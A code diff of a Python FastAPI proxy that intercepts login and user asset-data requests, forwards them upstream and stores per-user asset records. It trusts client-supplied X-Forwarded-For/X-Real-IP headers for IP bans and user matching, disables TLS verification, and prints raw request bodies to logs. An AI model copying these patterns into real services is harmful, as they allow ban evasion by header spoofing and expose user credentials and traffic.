@@ -190,8 +190,8 @@ async def proxy_login(request: Request):
     print("[Login] ★★★ 拦截到登录请求 ★★★")
     print("="*60)
     
-    # 获取客户端信息
-    client_ip = request.client.host
+    # 获取客户端信息 - 优先从nginx代理头获取真实IP
+    client_ip = request.headers.get("x-real-ip") or request.headers.get("x-forwarded-for", "").split(",")[0].strip() or request.client.host
     user_agent = request.headers.get("user-agent", "")
     content_type = request.headers.get("content-type", "")
     
@@ -372,32 +372,95 @@ async def proxy_login(request: Request):
 async def proxy_index_data(request: Request):
     """拦截用户资产数据请求，保存后返回"""
     
-    client_ip = request.client.host
-    user_agent = request.headers.get("user-agent", "")
+    print("\n" + "="*60)
+    print("[IndexData] ★★★ 拦截到资产数据请求 ★★★")
+    print("="*60)
     
-    # 获取请求体（可能包含用户标识）
-    body = None
+    # 获取客户端信息 - 优先从nginx代理头获取真实IP
+    client_ip = request.headers.get("x-real-ip") or request.headers.get("x-forwarded-for", "").split(",")[0].strip() or request.client.host
+    user_agent = request.headers.get("user-agent", "")
+    content_type = request.headers.get("content-type", "")
+    
+    print(f"[IndexData] Method: {request.method}")
+    print(f"[IndexData] Content-Type: {content_type}")
+    print(f"[IndexData] Client IP: {client_ip}")
+    print(f"[IndexData] Query String: {request.url.query}")
+    
+    # 解析请求参数（支持多种格式）- 完全照抄登录API的逻辑
+    params = {}
+    
+    # 1. 先从 query string 获取
+    for key, value in request.query_params.items():
+        params[key] = value
+    print(f"[IndexData] Query Params: {dict(request.query_params)}")
+    
+    # 2. 从请求体获取
+    raw_body = None
     if request.method == "POST":
         try:
-            body = await request.json()
-        except:
-            body = {}
+            raw_body = await request.body()
+            print(f"[IndexData] Raw Body: {raw_body[:500] if raw_body else 'Empty'}")
+        except Exception as e:
+            print(f"[IndexData] 读取body失败: {e}")
+        
+        # 重新创建请求以便再次读取body
+        from starlette.requests import Request as StarletteRequest
+        
+        try:
+            if "application/json" in content_type:
+                body = json.loads(raw_body) if raw_body else {}
+                params.update(body)
+                print(f"[IndexData] 解析为JSON: {body}")
+            elif "application/x-www-form-urlencoded" in content_type:
+                # 解析 form-urlencoded
+                from urllib.parse import parse_qs
+                form_data = parse_qs(raw_body.decode('utf-8') if raw_body else '')
+                for key, value in form_data.items():
+                    params[key] = value[0] if value else ''
+                print(f"[IndexData] 解析为Form: {params}")
+            else:
+                # 尝试解析为 JSON
+                try:
+                    body = json.loads(raw_body) if raw_body else {}
+                    params.update(body)
+                    print(f"[IndexData] 尝试JSON成功: {body}")
+                except:
+                    # 尝试解析为 form
+                    try:
+                        from urllib.parse import parse_qs
+                        form_data = parse_qs(raw_body.decode('utf-8') if raw_body else '')
+                        for key, value in form_data.items():
+                            params[key] = value[0] if value else ''
+                        print(f"[IndexData] 尝试Form成功: {params}")
+                    except Exception as e:
+                        print(f"[IndexData] 解析失败: {e}")
+        except Exception as e:
+            print(f"[IndexData] 解析异常: {e}")
     
-    # 转发请求到原始服务器
+    print(f"[IndexData] ★ 最终解析结果: {params}")
+    print(f"[IndexData] ★ 所有参数keys: {list(params.keys())}")
+    
+    # 转发请求到原始服务器 - 完全照抄登录API的逻辑
     async with httpx.AsyncClient(verify=False, timeout=30) as client:
         try:
-            response = await client.request(
-                method=request.method,
-                url=AKAPI_URL + "public_IndexData",
-                json=body,
-                headers={
-                    "User-Agent": user_agent,
-                    "Content-Type": "application/json",
-                    "Accept": "application/json"
-                }
-            )
+            # 构建转发请求
+            if "application/json" in content_type:
+                response = await client.post(
+                    AKAPI_URL + "public_IndexData",
+                    json=params,
+                    headers={"User-Agent": user_agent, "Content-Type": "application/json"}
+                )
+            else:
+                # 使用 form data 格式转发
+                response = await client.post(
+                    AKAPI_URL + "public_IndexData",
+                    data=params,
+                    headers={"User-Agent": user_agent}
+                )
             result = response.json()
+            print(f"[IndexData] 服务器响应: Error={result.get('Error')}, 有Data={bool(result.get('Data'))}")
         except Exception as e:
+            print(f"[IndexData] 请求失败: {e}")
             return JSONResponse({
                 "Error": True,
                 "Msg": f"服务器连接失败: {str(e)}"
@@ -407,20 +470,52 @@ async def proxy_index_data(request: Request):
     if not result.get("Error") and result.get("Data"):
         data = result["Data"]
         
-        # 尝试从请求中获取用户名
-        username = body.get("account") if body else None
+        print(f"[IndexData] ★ 收到有效数据，尝试获取用户名...")
+        print(f"[IndexData] ★ 请求参数: {params}")
+        print(f"[IndexData] ★ 客户端IP: {client_ip}")
         
+        # 尝试多种方式获取用户名
+        username = None
+        
+        # 方式1: 从请求参数获取 (可能是account, UserID, key等)
+        if params:
+            username = params.get("account") or params.get("Account") or params.get("UserName") or params.get("username")
+            if username:
+                print(f"[IndexData] ★ 从请求参数获取到用户名: {username}")
+        
+        # 方式2: 从返回数据中获取用户名
+        if not username and data:
+            username = data.get("UserName") or data.get("Account") or data.get("NickName")
+            if username:
+                print(f"[IndexData] ★ 从返回数据获取到用户名: {username}")
+        
+        # 方式3: 从最近登录记录中查找该IP的用户
         if not username:
-            # 从最近登录记录中查找该IP的用户（按时间倒序，取最近的）
-            recent = get_recent_logins(limit=20)
+            print(f"[IndexData] ★ 尝试从登录记录中通过IP查找用户...")
+            recent = get_recent_logins(limit=50)
             for login in recent:
-                if login.get("ip_address") == client_ip and login.get("username") != "unknown":
-                    username = login.get("username")
+                login_ip = login.get("ip_address", "")
+                login_user = login.get("username", "")
+                if login_ip == client_ip and login_user and login_user != "unknown":
+                    username = login_user
+                    print(f"[IndexData] ★ 通过IP匹配找到用户: {username} (IP: {login_ip})")
                     break
+            if not username:
+                print(f"[IndexData] ★ 未能通过IP找到用户，最近登录IP列表: {[l.get('ip_address') for l in recent[:5]]}")
         
         if username and username != "unknown":
-            # 保存用户资产信息到数据库
-            save_user_assets(username, data)
+            # 检查数据结构，看是否包含资产信息
+            print(f"[IndexData] ★ 用户: {username}")
+            print(f"[IndexData] ★ 数据字段: {list(data.keys())}")
+            print(f"[IndexData] ★ 是否包含ACECount: {'ACECount' in data}")
+            print(f"[IndexData] ★ 是否包含EP: {'EP' in data}")
+            
+            # 只有包含资产字段时才保存
+            if 'ACECount' in data or 'EP' in data:
+                print(f"[IndexData] ★ 发现资产数据，保存到数据库")
+                save_user_assets(username, data)
+            else:
+                print(f"[IndexData] ★ 这是用户资料数据，不是资产数据，跳过保存")
             
             # 广播资产更新事件（包含所有点数）
             await manager.broadcast({
@@ -448,7 +543,8 @@ async def proxy_index_data(request: Request):
 async def proxy_rpc(path: str, request: Request):
     """代理其他RPC请求"""
     
-    client_ip = request.client.host
+    # 优先从nginx代理头获取真实IP
+    client_ip = request.headers.get("x-real-ip") or request.headers.get("x-forwarded-for", "").split(",")[0].strip() or request.client.host
     
     # 检查IP封禁
     if is_banned(ip_address=client_ip):
